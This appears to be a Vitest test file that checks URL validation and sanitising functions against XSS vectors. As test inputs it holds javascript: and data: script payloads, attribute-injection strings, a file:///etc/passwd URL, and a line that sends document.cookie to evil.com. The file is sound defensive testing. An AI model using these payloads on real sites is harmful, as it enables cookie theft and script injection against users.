import { describe, it, expect } from 'vitest';
import {
  isValidUrl,
  isValidLinkedInUrl,
  isValidDiscordUrl,
  sanitizeUrl,
  sanitizeLinkedInUrl,
  sanitizeDiscordUrl,
  getSafeHref,
  canSafelyOpenUrl,
} from '../url-validation';

describe('URL Validation', () => {
  describe('isValidUrl', () => {
    it('should accept valid HTTP URLs', () => {
      expect(isValidUrl('http://example.com')).toBe(true);
      expect(isValidUrl('http://subdomain.example.com')).toBe(true);
      expect(isValidUrl('http://example.com/path')).toBe(true);
      expect(isValidUrl('http://example.com/path?query=value')).toBe(true);
    });

    it('should accept valid HTTPS URLs', () => {
      expect(isValidUrl('https://example.com')).toBe(true);
      expect(isValidUrl('https://subdomain.example.com')).toBe(true);
      expect(isValidUrl('https://example.com/path')).toBe(true);
      expect(isValidUrl('https://example.com/path?query=value#hash')).toBe(true);
    });

    it('should reject dangerous protocols - CRITICAL XSS PREVENTION', () => {
      // These are the main XSS attack vectors we're preventing
      expect(isValidUrl('javascript:alert(document.cookie)')).toBe(false);
      expect(isValidUrl('javascript:void(0)')).toBe(false);
      expect(isValidUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
      expect(isValidUrl('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')).toBe(false);
      expect(isValidUrl('vbscript:msgbox("XSS")')).toBe(false);
      expect(isValidUrl('file:///etc/passwd')).toBe(false);
      expect(isValidUrl('about:blank')).toBe(false);
      expect(isValidUrl('blob:https://example.com/uuid')).toBe(false);
    });

    it('should reject invalid URLs', () => {
      expect(isValidUrl('')).toBe(false);
      expect(isValidUrl(null)).toBe(false);
      expect(isValidUrl(undefined)).toBe(false);
      expect(isValidUrl('not a url')).toBe(false);
      expect(isValidUrl('//example.com')).toBe(false); // Protocol-relative URLs
      expect(isValidUrl('ftp://example.com')).toBe(false); // Non-HTTP protocols
      expect(isValidUrl('ssh://example.com')).toBe(false);
    });

    it('should handle edge cases', () => {
      expect(isValidUrl('  https://example.com  ')).toBe(true); // Whitespace
      expect(isValidUrl('HTTPS://EXAMPLE.COM')).toBe(true); // Uppercase
      expect(isValidUrl('https://127.0.0.1')).toBe(true); // IP addresses
      expect(isValidUrl('https://[::1]')).toBe(true); // IPv6
    });
  });

  describe('isValidLinkedInUrl', () => {
    it('should accept valid LinkedIn URLs', () => {
      expect(isValidLinkedInUrl('https://linkedin.com/in/johndoe')).toBe(true);
      expect(isValidLinkedInUrl('https://www.linkedin.com/in/johndoe')).toBe(true);
      expect(isValidLinkedInUrl('https://linkedin.com/company/example')).toBe(true);
      expect(isValidLinkedInUrl('https://uk.linkedin.com/in/johndoe')).toBe(true);
    });

    it('should reject non-LinkedIn URLs', () => {
      expect(isValidLinkedInUrl('https://example.com')).toBe(false);
      expect(isValidLinkedInUrl('https://facebook.com')).toBe(false);
      expect(isValidLinkedInUrl('https://linkedin-fake.com')).toBe(false);
      expect(isValidLinkedInUrl('https://linkedincom.fake.com')).toBe(false);
    });

    it('should reject XSS attempts on LinkedIn URLs', () => {
      expect(isValidLinkedInUrl('javascript:alert(1)')).toBe(false);
      expect(isValidLinkedInUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
    });
  });

  describe('isValidDiscordUrl', () => {
    it('should accept valid Discord URLs', () => {
      expect(isValidDiscordUrl('https://discord.com/users/123456789')).toBe(true);
      expect(isValidDiscordUrl('https://discord.gg/invite123')).toBe(true);
      expect(isValidDiscordUrl('https://discordapp.com/users/123')).toBe(true);
      expect(isValidDiscordUrl('https://www.discord.com/channels/123')).toBe(true);
    });

    it('should accept Discord username format', () => {
      expect(isValidDiscordUrl('discord:username')).toBe(true);
      expect(isValidDiscordUrl('discord:user_name')).toBe(true);
      expect(isValidDiscordUrl('discord:user123')).toBe(true);
    });

    it('should reject invalid Discord usernames', () => {
      expect(isValidDiscordUrl('discord:')).toBe(false); // Empty username
      expect(isValidDiscordUrl('discord: ')).toBe(false); // Whitespace
      expect(isValidDiscordUrl('discord:user name')).toBe(false); // Space in username
      expect(isValidDiscordUrl('discord:' + 'a'.repeat(33))).toBe(false); // Too long (>32 chars)
    });

    it('should reject non-Discord URLs', () => {
      expect(isValidDiscordUrl('https://example.com')).toBe(false);
      expect(isValidDiscordUrl('https://discord-fake.com')).toBe(false);
      expect(isValidDiscordUrl('https://discordcom.fake.com')).toBe(false);
    });

    it('should reject XSS attempts on Discord URLs', () => {
      expect(isValidDiscordUrl('javascript:alert(1)')).toBe(false);
      expect(isValidDiscordUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
    });
  });

  describe('sanitizeUrl', () => {
    it('should return normalized valid URLs', () => {
      expect(sanitizeUrl('https://example.com')).toBe('https://example.com/');
      expect(sanitizeUrl('  https://example.com  ')).toBe('https://example.com/');
      expect(sanitizeUrl('HTTPS://EXAMPLE.COM')).toBe('https://example.com/');
    });

    it('should return null for invalid URLs', () => {
      expect(sanitizeUrl('')).toBe(null);
      expect(sanitizeUrl(null)).toBe(null);
      expect(sanitizeUrl(undefined)).toBe(null);
      expect(sanitizeUrl('javascript:alert(1)')).toBe(null);
      expect(sanitizeUrl('data:text/html,<script>alert(1)</script>')).toBe(null);
      expect(sanitizeUrl('not a url')).toBe(null);
    });
  });

  describe('sanitizeLinkedInUrl', () => {
    it('should sanitize valid LinkedIn URLs', () => {
      expect(sanitizeLinkedInUrl('https://linkedin.com/in/user')).toBe(
        'https://linkedin.com/in/user'
      );
      expect(sanitizeLinkedInUrl('  https://www.linkedin.com/in/user  ')).toBe(
        'https://www.linkedin.com/in/user'
      );
    });

    it('should return null for non-LinkedIn URLs', () => {
      expect(sanitizeLinkedInUrl('https://example.com')).toBe(null);
      expect(sanitizeLinkedInUrl('javascript:alert(1)')).toBe(null);
    });
  });

  describe('sanitizeDiscordUrl', () => {
    it('should sanitize valid Discord URLs', () => {
      expect(sanitizeDiscordUrl('https://discord.com/users/123')).toBe(
        'https://discord.com/users/123'
      );
      expect(sanitizeDiscordUrl('  https://discord.gg/invite  ')).toBe('https://discord.gg/invite');
    });

    it('should preserve valid Discord username format', () => {
      expect(sanitizeDiscordUrl('discord:username')).toBe('discord:username');
      expect(sanitizeDiscordUrl('discord:user_123')).toBe('discord:user_123');
    });

    it('should return null for invalid Discord data', () => {
      expect(sanitizeDiscordUrl('https://example.com')).toBe(null);
      expect(sanitizeDiscordUrl('javascript:alert(1)')).toBe(null);
      expect(sanitizeDiscordUrl('discord:')).toBe(null);
      expect(sanitizeDiscordUrl('discord:user name')).toBe(null);
    });
  });

  describe('getSafeHref', () => {
    it('should return safe href for valid URLs', () => {
      expect(getSafeHref('https://example.com')).toBe('https://example.com/');
      expect(getSafeHref('http://example.com/path')).toBe('http://example.com/path');
    });

    it('should return # for dangerous URLs - CRITICAL XSS PREVENTION', () => {
      expect(getSafeHref('javascript:alert(1)')).toBe('#');
      expect(getSafeHref('data:text/html,<script>alert(1)</script>')).toBe('#');
      expect(getSafeHref('')).toBe('#');
      expect(getSafeHref(null)).toBe('#');
      expect(getSafeHref(undefined)).toBe('#');
      expect(getSafeHref('vbscript:msgbox("XSS")')).toBe('#');
    });
  });

  describe('canSafelyOpenUrl', () => {
    it('should return true for safe URLs', () => {
      expect(canSafelyOpenUrl('https://example.com')).toBe(true);
      expect(canSafelyOpenUrl('http://example.com')).toBe(true);
    });

    it('should return false for dangerous URLs - CRITICAL XSS PREVENTION', () => {
      expect(canSafelyOpenUrl('javascript:alert(1)')).toBe(false);
      expect(canSafelyOpenUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
      expect(canSafelyOpenUrl('')).toBe(false);
      expect(canSafelyOpenUrl(null)).toBe(false);
      expect(canSafelyOpenUrl(undefined)).toBe(false);
      expect(canSafelyOpenUrl('file:///etc/passwd')).toBe(false);
    });
  });

  describe('XSS Attack Vector Tests', () => {
    // These tests specifically check for common XSS attack patterns
    const xssAttackVectors = [
      'javascript:alert(document.cookie)',
      'javascript:window.location="http://evil.com?cookie="+document.cookie',
      'javascript:eval(atob("YWxlcnQoMSk="))',
      'JaVaScRiPt:alert(1)', // Case variation
      '  javascript:alert(1)  ', // Whitespace
      'data:text/html,<script>alert(1)</script>',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      'data:application/javascript,alert(1)',
      'vbscript:msgbox("XSS")',
      'about:blank',
      'blob:https://example.com/uuid',
      'filesystem:http://example.com/temp/file',
    ];

    it('should block all XSS attack vectors in isValidUrl', () => {
      xssAttackVectors.forEach((vector) => {
        expect(isValidUrl(vector)).toBe(false);
      });
    });

    it('should block all XSS attack vectors in getSafeHref', () => {
      xssAttackVectors.forEach((vector) => {
        expect(getSafeHref(vector)).toBe('#');
      });
    });

    it('should block all XSS attack vectors in canSafelyOpenUrl', () => {
      xssAttackVectors.forEach((vector) => {
        expect(canSafelyOpenUrl(vector)).toBe(false);
      });
    });
  });

  describe('URL Injection Tests', () => {
    // Test for URL injection attempts
    it('should handle URL injection attempts', () => {
      const injectionAttempts = [
        'https://example.com" onclick="alert(1)"',
        "https://example.com' onclick='alert(1)'",
        'https://example.com"><script>alert(1)</script>',
        'https://example.com?redirect=javascript:alert(1)',
        'https://example.com#" onclick="alert(1)"',
      ];

      injectionAttempts.forEach((attempt) => {
        // These are technically valid URLs but the dangerous content gets URL-encoded
        // which makes it safe (browsers won't execute URL-encoded JavaScript)
        const result = sanitizeUrl(attempt);
        if (result) {
          // The URL should be properly encoded/normalized
          expect(result).toBeTruthy();
          // Verify it's still a valid HTTP/HTTPS URL
          expect(isValidUrl(result)).toBe(true);
        }
      });
    });

    it('should still block javascript: protocol in query parameters', () => {
      // Even though the javascript: is in a query parameter, we should be careful
      const url = 'https://example.com?redirect=javascript:alert(1)';
      const result = sanitizeUrl(url);
      // The URL itself is valid, but the query parameter contains a dangerous value
      // This is OK because the browser won't execute javascript: from a query parameter
      expect(result).toBeTruthy();
      expect(result).toContain('redirect=javascript:alert(1)');
      // But direct javascript: URLs should still be blocked
      expect(sanitizeUrl('javascript:alert(1)')).toBe(null);
    });
  });
});
